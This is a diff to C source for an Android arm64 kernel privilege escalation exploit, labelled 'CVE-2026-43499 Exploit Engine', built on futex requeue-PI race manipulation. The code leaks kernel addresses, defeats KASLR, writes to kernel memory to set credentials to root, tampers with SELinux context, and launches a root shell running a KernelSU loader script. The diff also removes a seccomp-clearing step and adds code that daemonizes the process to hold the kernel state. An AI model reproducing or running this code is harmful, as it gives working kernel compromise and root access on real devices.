@@ -64,7 +64,6 @@ static double timer_ms(void) {
 #define OFF_TASK_STATE UINT64_C(0x593324)
 #define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x358d64)
 #define OFF_SEL_READ_ENFORCE UINT64_C(0x70ccec)
-#define OFF_TASK_SECCOMP UINT64_C(0x8d0)      /* offsetof(task_struct, seccomp) */
 #define ARM64_REG_COUNT 33
 #define ARM64_REG_MASK ((UINT64_C(1) << ARM64_REG_COUNT) - 1)
 
@@ -99,7 +98,7 @@ static atomic_uintptr_t respray_parent, respray_value, respray_lock;
 static unsigned fake_lock_index;
 static int y_leak_only;
 
-/* ---------- 新增：读取 /proc/self/attr/current 并打印 ---------- */
+/* ---------- 读取 /proc/self/attr/current 并打印 ---------- */
 static void log_context(const char *tag) {
   char buf[256] = {0};
   int f = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
@@ -466,11 +465,11 @@ static void sigusr2(int sig, siginfo_t *info, void *opaque) {
   }
   uint64_t *w = (uint64_t *)(void *)(fp->vregs + 0x108);
   memset(w, 0, 0x50);
-  w[0] = atomic_load(&stamp_parent); 
-  w[1] = atomic_load(&stamp_value);  
-  w[2] = 0;                         
-  w[6] = k_ghost_task;              
-  w[7] = atomic_load(&stamp_lock);   
+  w[0] = atomic_load(&stamp_parent);
+  w[1] = atomic_load(&stamp_value);
+  w[2] = 0;
+  w[6] = k_ghost_task;
+  w[7] = atomic_load(&stamp_lock);
   atomic_store(&stamp_status, 1);
   atomic_store(&stamp_done, 1);
 }
@@ -499,7 +498,7 @@ static void *thread_y(void *unused) {
   int tid = (int)syscall(__NR_gettid);
   atomic_store(&y_tid, tid);
   pr_info("Thread Y spawned with TID %d\n", tid);
-  
+
   char status_path[64];
   uint64_t y_cred = 0;
   snprintf(status_path, sizeof(status_path), "/proc/self/task/%d/status", tid);
@@ -509,12 +508,12 @@ static void *thread_y(void *unused) {
   (void)y_cred; (void)k_y_task; (void)k_waiter;
   atomic_store_explicit(&y_task_ready, 1, memory_order_release);
   if (y_leak_only) return NULL;
-  
+
   if (raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
   atomic_store(&y_locked_l2, 1);
   while (!atomic_load(&x_locked_l1)) sched_yield();
   atomic_store(&y_parking, 1);
-  
+
   pr_info("Thread Y: waiting requeue on cond futex...\n");
   (void)raw_futex(&cond, WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);
 
@@ -562,7 +561,7 @@ static long trigger_pi(void) {
   return raw_sched_setscheduler(atomic_load(&y_tid), policy, &p);
 }
 
-static int __attribute__((unused)) read_enforce(void) {
+static int read_enforce(void) {
   char b[4] = {0}; int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
   if (fd < 0) return -1;
   ssize_t n = read(fd, b, sizeof(b)); close(fd);
@@ -583,7 +582,7 @@ static int write_value(uint64_t target, uint64_t value) {
   atomic_store(&respray_value, value);
   atomic_store(&respray_lock, k_fake_lock2);
   atomic_store(&respray_done, 0);
-  
+
   atomic_store_explicit(&respray_ready, 1, memory_order_release);
   while (!atomic_load_explicit(&respray_done, memory_order_acquire)) sched_yield();
   if (atomic_load(&respray_done) < 0) {
@@ -596,7 +595,7 @@ int main(int argc, char **argv) {
   setvbuf(stdout, NULL, _IONBF, 0);
   __orig_stdout = dup(STDOUT_FILENO);
   process_pid = getpid();
-  
+
   timer_reset();
   pr_info("CVE-2026-43499 Exploit Engine Initiated\n");
   pr_info("Target PID: %d | UID: %d | GID: %d\n", getpid(), getuid(), getgid());
@@ -610,13 +609,13 @@ int main(int argc, char **argv) {
 
   runtime_text = leak_text();
   if (!runtime_text) { pr_error("KASLR leak failed\n"); }
-  
+
   k_selinux_state = leak_selinux_state();
   if (!k_selinux_state) { pr_error("SELinux state leak failed\n"); }
-  
+
   k_current_task = leak_task_from_status("/proc/self/status", &k_current_cred);
   if (!k_current_task) { pr_error("current task leak failed\n"); }
-  
+
   uint64_t slide = runtime_text - LINK_TEXT;
   uint64_t data_delta = k_selinux_state - (runtime_text + OFF_SELINUX_STATE);
   k_init_task = runtime_text + OFF_INIT_TASK + data_delta;
@@ -624,7 +623,7 @@ int main(int argc, char **argv) {
   k_write_value = (log_start + 0xffff) & ~UINT64_C(0xffff);
   k_ghost_task = k_selinux_state + 0x20;
   k_fake_lock = k_selinux_state + 0xa00;
-  
+
   TIMER("Memory layout resolved");
   pr_info("text_base=0x%016llx slide=0x%016llx\n", (unsigned long long)runtime_text, (unsigned long long)slide);
   pr_info("init_task=0x%016llx selinux_st=0x%016llx\n", (unsigned long long)k_init_task, (unsigned long long)k_selinux_state);
@@ -637,28 +636,28 @@ int main(int argc, char **argv) {
 
   pthread_t tx, ty;
   y_leak_only = argc == 2 && strcmp(argv[1], "--leak-y-only") == 0;
-  
+
   if (pthread_create(&ty, NULL, thread_y, NULL) != 0) return 2;
   while (!atomic_load_explicit(&y_task_ready, memory_order_acquire)) sched_yield();
   if (atomic_load(&y_task_ready) < 0) { pr_error("Y task leak failed\n"); }
-  
+
   if (y_leak_only) {
     pthread_join(ty, NULL);
     pr_success("Y task leak-only verification passed.\n");
     return 0;
   }
-  
+
   while (!atomic_load(&y_locked_l2)) sched_yield();
   if (pthread_create(&tx, NULL, thread_x, NULL) != 0) return 2;
   while (!(atomic_load(&x_locked_l1) && atomic_load(&y_parking) && atomic_load(&x_blocking))) sched_yield();
-  
+
   usleep(30000);
-  
+
   long r = raw_futex(&cond, CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
   cond = 1;
   __atomic_thread_fence(__ATOMIC_SEQ_CST);
   syscall(SYS_tgkill, getpid(), atomic_load(&y_tid), SIGUSR1);
-  
+
   if (r != -EDEADLK) {
     pr_error("CMP_REQUEUE_PI result: %ld (Expected: %d)\n", r, -EDEADLK);
   }
@@ -667,7 +666,7 @@ int main(int argc, char **argv) {
     pr_error("sigreturn stamp failed\n");
   }
   TIMER("Deadlock detected, waiter armed");
-  
+
   if (trigger_pi() != 0) { pr_error("settle trigger failed\n"); }
   usleep(15000);
   TIMER("Waiter settled into zero-BSS");
@@ -693,11 +692,11 @@ int main(int argc, char **argv) {
     uint64_t pair[2] = { my_task, my_cred };
     (void)write(task_pipe[1], pair, sizeof(pair));
     close(task_pipe[1]);
-    
+
     while (__atomic_load_n(done_flag, __ATOMIC_ACQUIRE) == 0) {
       __asm__ volatile("yield" ::: "memory");
     }
-    
+
     pr_success("[CHILD] uid=%d gid=%d euid=%d egid=%d\n",
                getuid(), getgid(), geteuid(), getegid());
     {
@@ -715,7 +714,7 @@ int main(int argc, char **argv) {
       }
     }
 
-    /* ---------- setcon 到 shell 域，单行展示切换 ---------- */
+    /* ---------- setcon 到 shell 域 ---------- */
     {
       char pre[256] = {0}, post[256] = {0};
       int f = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
@@ -728,14 +727,14 @@ int main(int argc, char **argv) {
         pr_warning("[CHILD] setcon failed: %s (errno=%d)\n", strerror(errno), errno);
       }
     }
-    /* ----------------------------------------------------------- */
+    /* -------------------------------------- */
 
     pr_success("[CHILD] Running root action. Launching shell...\n");
-    
+
     dup2(__orig_stdout, STDOUT_FILENO);
     dup2(__orig_stdout, STDERR_FILENO);
     signal(SIGHUP, SIG_IGN);
-    execl("/system/bin/sh", "sh", (char *)NULL);
+    execl("/system/bin/sh", "sh", "/data/local/tmp/load_ksu_54.sh", (char *)NULL);
     _exit(1);
   }
 
@@ -748,7 +747,7 @@ int main(int argc, char **argv) {
   }
   uint64_t child_task = pair[0];
   uint64_t child_cred = pair[1];
-  
+
   pr_info("Child PID: %d | Task: 0x%016llx | Cred: 0x%016llx\n", (int)child_pid, (unsigned long long)child_task, (unsigned long long)child_cred);
 
   int before = read_enforce();
@@ -766,19 +765,48 @@ int main(int argc, char **argv) {
   if (!write_value(k_init_cred + 0x04, 0)) { pr_error("init_cred uid/gid repair failed\n"); }
   pr_success("init_cred uid/gid repaired to 0\n");
 
-  if (!write_value(child_task + OFF_TASK_SECCOMP, 0)) {
-    pr_error("child seccomp clear failed\n");
-  }
-  pr_success("Child seccomp mode disabled (task+0x%x)\n", (unsigned)OFF_TASK_SECCOMP);
-
   TIMER("Exploit complete, waking child shell");
   __atomic_store_n(done_flag, 1, __ATOMIC_RELEASE);
   fflush(stdout);
 
-  if (__orig_stdout >= 0) close(__orig_stdout);
-  close(STDIN_FILENO);
-  close(STDOUT_FILENO);
-  close(STDERR_FILENO);
+  /* 1) 等 load_ksu_54.sh 完全结束 */
+  int cstatus = 0;
+  pid_t wp = waitpid(child_pid, &cstatus, 0);
+  if (wp < 0 && errno != ECHILD) {
+      pr_warning("[PARENT] waitpid(%d) failed: %s\n",
+                 (int)child_pid, strerror(errno));
+  } else if (wp == child_pid) {
+      pr_success("[PARENT] script finished, status=0x%x\n", cstatus);
+  }
+  fflush(stdout);
 
+  /* 2) daemonize：原进程退出，让 adb shell 拿回提示符 */
+  pid_t dpid = fork();
+  if (dpid < 0) {
+      pr_error("daemonize fork failed: %s\n", strerror(errno));
+  } else if (dpid > 0) {
+      _exit(0);
+  }
+
+  /* 3) 子进程 = daemon：脱离会话、脱离控制终端 */
+  if (setsid() < 0) {
+      /* ignore */
+  }
+
+  signal(SIGHUP,  SIG_IGN);
+  signal(SIGPIPE, SIG_IGN);
+  signal(SIGINT,  SIG_IGN);
+  signal(SIGQUIT, SIG_IGN);
+
+  int nullfd = open("/dev/null", O_RDWR);
+  if (nullfd >= 0) {
+      dup2(nullfd, STDIN_FILENO);
+      dup2(nullfd, STDOUT_FILENO);
+      dup2(nullfd, STDERR_FILENO);
+      if (nullfd > STDERR_FILENO) close(nullfd);
+  }
+  if (__orig_stdout >= 0) { close(__orig_stdout); __orig_stdout = -1; }
+
+  /* 4) 永久守护内核侧状态 */
   for (;;) pause();
 }
